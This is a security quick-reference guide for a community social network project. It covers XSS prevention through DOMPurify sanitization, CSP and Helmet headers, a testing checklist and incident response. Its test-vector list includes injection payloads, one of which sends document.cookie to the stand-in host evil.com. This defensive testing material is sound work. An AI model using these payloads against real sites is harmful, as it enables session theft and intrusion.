# Security Quick Reference Guide

**Project**: Community Social Network MVP
**Last Updated**: 2025-12-04
**Status**: Active Development

---

## Critical Security Issues from Validation Report

| ID | Issue | Priority | Status | Documentation |
|----|-------|----------|--------|---------------|
| **#3** | XSS Prevention Not Specified | 🔴 CRITICAL | ✅ Completed | [XSS Prevention Spec](./security/XSS_PREVENTION_SPECIFICATION.md) |
| **#4** | Malicious File Upload Prevention | 🔴 CRITICAL | ⚠️ Pending | To be created |
| **#5** | Distributed Rate Limiting Strategy | 🔴 HIGH | ⚠️ Pending | To be created |
| **#1** | RBAC Permission Matrix | 🔴 CRITICAL | ⚠️ Pending | To be created |

---

## XSS Prevention - Quick Implementation Guide

### 🚀 Fastest Path to Production Security

**Total Time**: 8 hours (1 day)

#### Step 1: Install Dependencies (5 minutes)
```bash
# Backend
npm install isomorphic-dompurify
npm install --save-dev @types/dompurify

# Frontend
npm install dompurify
npm install --save-dev @types/dompurify

# Security middleware
npm install helmet
```

#### Step 2: Server-Side Sanitization (2 hours)
```typescript
// src/utils/sanitization.ts
import DOMPurify from 'isomorphic-dompurify';

export function sanitizePostContent(input: string): string {
  return DOMPurify.sanitize(input, {
    ALLOWED_TAGS: ['b', 'i', 'u', 'strong', 'em', 'p', 'br', 'ul', 'ol', 'li', 'a'],
    ALLOWED_ATTR: ['href', 'target'],
    ALLOWED_URI_REGEXP: /^(?:https?:\/\/)/i
  });
}

export function sanitizeUserBio(input: string): string {
  return DOMPurify.sanitize(input, { ALLOWED_TAGS: [] }); // Strip ALL HTML
}
```

**Apply in Controllers**:
```typescript
// Before saving to database
const sanitizedContent = sanitizePostContent(req.body.content);
```

#### Step 3: Content Security Policy (1 hour)
```typescript
// src/middleware/security.ts
import helmet from 'helmet';

app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'", "'nonce-{RANDOM_NONCE}'"],
    objectSrc: ["'none'"],
    upgradeInsecureRequests: []
  }
}));
```

#### Step 4: Client-Side Defense (1 hour)
```typescript
// src/components/Post.tsx
import DOMPurify from 'dompurify';

function Post({ content }: { content: string }) {
  const sanitized = DOMPurify.sanitize(content);
  return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
}
```

#### Step 5: Testing (4 hours)
```typescript
// tests/security/xss.test.ts
describe('XSS Prevention', () => {
  test('removes script tags', () => {
    const malicious = '<script>alert("XSS")</script>';
    const sanitized = sanitizePostContent(malicious);
    expect(sanitized).not.toContain('<script>');
  });

  // Add 29+ more test vectors
});
```

---

## Top 10 XSS Test Vectors (Must Test)

### Quick Test Suite
```javascript
const CRITICAL_XSS_VECTORS = [
  '<script>alert("XSS")</script>',                          // #1: Basic script injection
  '<img src=x onerror=alert(1)>',                          // #2: Event handler injection
  '<a href="javascript:alert(1)">Click</a>',               // #3: JavaScript protocol
  '<iframe src="javascript:alert(1)"></iframe>',           // #4: iframe injection
  '<svg onload=alert(1)>',                                 // #5: SVG-based XSS
  '<img src=x onerror=&#97;lert(1)>',                     // #6: HTML entity bypass
  '<script>fetch("https://evil.com?cookie="+document.cookie)</script>', // #7: Cookie theft
  '<object data="javascript:alert(1)">',                   // #8: Object tag injection
  '<input autofocus onfocus=alert(1)>',                   // #9: Autofocus attack
  'javascript:alert(1)' // in URL parameter                // #10: Reflected XSS
];
```

**Test Coverage**: Each vector should be tested in:
- Post content
- Comment content
- User bio
- Search query
- URL parameters

---

## Content Security Policy - Essential Configuration

### Minimal Production-Ready CSP

```typescript
// COPY-PASTE READY
const CSP_CONFIG = {
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'", "'nonce-{NONCE}'"], // IMPORTANT: Generate nonce per request
    styleSrc: ["'self'", "'nonce-{NONCE}'"],
    imgSrc: ["'self'", "data:", "https://s3.amazonaws.com"],
    connectSrc: ["'self'", "https://api.startit.rs", "wss://api.startit.rs"],
    frameSrc: ["'none'"],
    objectSrc: ["'none'"],
    baseUri: ["'self'"],
    formAction: ["'self'"],
    upgradeInsecureRequests: []
  }
};
```

**Nonce Generation** (CRITICAL):
```typescript
import crypto from 'crypto';

app.use((req, res, next) => {
  res.locals.cspNonce = crypto.randomBytes(16).toString('base64');
  next();
});
```

---

## Security Headers - Full Configuration

### Production-Ready Helmet.js Config

```typescript
import helmet from 'helmet';

app.use(helmet({
  contentSecurityPolicy: { /* CSP config above */ },
  xContentTypeOptions: true,                    // Prevent MIME sniffing
  xFrameOptions: { action: 'deny' },           // Prevent clickjacking
  xXssProtection: true,                        // Legacy XSS filter
  referrerPolicy: { policy: 'strict-origin-when-cross-origin' },
  hsts: {
    maxAge: 31536000,                          // 1 year
    includeSubDomains: true,
    preload: true
  }
}));
```

---

## Sanitization Configuration by Content Type

### Copy-Paste Ready Configurations

```typescript
export const SANITIZATION_CONFIG = {
  // Post content (rich text allowed)
  postContent: {
    ALLOWED_TAGS: ['b', 'i', 'u', 'strong', 'em', 'p', 'br', 'ul', 'ol', 'li', 'a'],
    ALLOWED_ATTR: ['href', 'target'],
    ALLOWED_URI_REGEXP: /^(?:https?:\/\/)/i,
    MAX_LENGTH: 10000
  },

  // Comment content (limited formatting)
  commentContent: {
    ALLOWED_TAGS: ['b', 'i', 'u', 'a'],
    ALLOWED_ATTR: ['href', 'target'],
    ALLOWED_URI_REGEXP: /^(?:https?:\/\/)/i,
    MAX_LENGTH: 2000
  },

  // User bio (plain text only)
  userBio: {
    ALLOWED_TAGS: [],
    MAX_LENGTH: 500
  },

  // Group description (moderate formatting)
  groupDescription: {
    ALLOWED_TAGS: ['b', 'i', 'u', 'a', 'p', 'br'],
    ALLOWED_ATTR: ['href', 'target'],
    ALLOWED_URI_REGEXP: /^(?:https?:\/\/)/i,
    MAX_LENGTH: 1000
  },

  // Username (strict validation)
  username: {
    ALLOWED_PATTERN: /^[a-zA-Z0-9_]{3,20}$/,
    MAX_LENGTH: 20
  },

  // Display name (plain text)
  displayName: {
    ALLOWED_TAGS: [],
    MAX_LENGTH: 50
  }
};
```

---

## Common Mistakes to Avoid

### ❌ WRONG
```typescript
// NEVER do this
function UnsafePost({ content }) {
  return <div dangerouslySetInnerHTML={{ __html: content }} />; // XSS vulnerability!
}

// NEVER allow user input in scripts
<script>
  const userId = '{userInput}'; // XSS if userInput contains '
</script>

// NEVER trust client-side sanitization alone
// Client-side can be bypassed by direct API calls
```

### ✅ CORRECT
```typescript
// ALWAYS sanitize on server before saving
const sanitized = sanitizePostContent(req.body.content);
await prisma.post.create({ data: { content: sanitized } });

// ALWAYS sanitize again on client (defense in depth)
function SafePost({ content }) {
  const sanitized = DOMPurify.sanitize(content);
  return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
}

// ALWAYS use JSON.stringify for user input in JavaScript
<script>
  const userId = {JSON.stringify(userInput)};
</script>
```

---

## Testing Checklist

### Pre-Deployment Security Audit

**Automated Testing**:
- [ ] 30+ XSS test vectors implemented
- [ ] BDD security scenarios (15+ scenarios)
- [ ] Integration tests cover all input fields
- [ ] OWASP ZAP automated scan passed
- [ ] ESLint security rules enforced

**Manual Testing**:
- [ ] Burp Suite penetration test completed
- [ ] CSP violations monitored (0 violations in production)
- [ ] Third-party security audit (if budget allows)
- [ ] Code review with security focus

**Configuration Verification**:
- [ ] DOMPurify configured for all content types
- [ ] CSP header present in all responses
- [ ] Nonce generation cryptographically secure
- [ ] Security headers configured (Helmet.js)
- [ ] HTTPOnly + Secure flags on cookies

---

## Incident Response - Quick Actions

### If XSS is Detected in Production

**Immediate Actions (< 1 hour)**:
1. ✅ **Identify**: Which endpoint/field is vulnerable?
2. ✅ **Contain**: Deploy stricter sanitization immediately
3. ✅ **Revoke**: Invalidate all session tokens if cookie theft suspected
4. ✅ **Block**: IP-based blocking if attack is ongoing

**Short-Term (< 24 hours)**:
5. ✅ **Fix**: Implement comprehensive sanitization
6. ✅ **Test**: Run full XSS test suite
7. ✅ **Deploy**: Hotfix to production
8. ✅ **Monitor**: CSP violation logs + error monitoring

**Post-Incident (< 1 week)**:
9. ✅ **Analyze**: Root cause analysis
10. ✅ **Update**: Security guidelines and training
11. ✅ **Improve**: Add regression test

---

## Performance Considerations

### Sanitization Performance

**Benchmarks** (DOMPurify):
- Simple text (< 100 chars): < 1ms
- Post content (< 10,000 chars): < 5ms
- Complex HTML (< 50,000 chars): < 20ms

**Optimization Tips**:
- ✅ Sanitize once on server, store sanitized version
- ✅ Cache sanitized content in Redis (for frequently viewed posts)
- ✅ Use memoization on client-side (React.useMemo)
- ❌ Don't sanitize on every render

**Example**:
```typescript
// ✅ Efficient: Sanitize once, cache result
const sanitized = useMemo(() => {
  return DOMPurify.sanitize(content);
}, [content]);

// ❌ Inefficient: Sanitize on every render
const sanitized = DOMPurify.sanitize(content); // Called 60+ times/second
```

---

## Resources

### Essential Documentation
- 📄 [XSS Prevention Specification](./security/XSS_PREVENTION_SPECIFICATION.md) - Complete specification (60 pages)
- 📄 [Security Specifications README](./security/README.md) - Directory overview
- 🔗 [OWASP XSS Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- 🔗 [DOMPurify GitHub](https://github.com/cure53/DOMPurify)

### Testing Tools
- 🛠️ [OWASP ZAP](https://www.zaproxy.org/) - Automated vulnerability scanner
- 🛠️ [Burp Suite](https://portswigger.net/burp) - Manual penetration testing
- 🛠️ [XSS Hunter](https://xsshunter.com/) - Blind XSS detection

### Learning Resources
- 📺 [PortSwigger XSS Academy](https://portswigger.net/web-security/cross-site-scripting)
- 📖 [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)

---

## Contact

**Security Team**: security@startit.rs
**QE Security Scanner Agent**: See agent documentation
**Emergency Hotline**: [To be configured]

---

**Last Updated**: 2025-12-04
**Next Review**: After implementation of XSS prevention
**Document Maintained By**: QE Security Scanner Agent
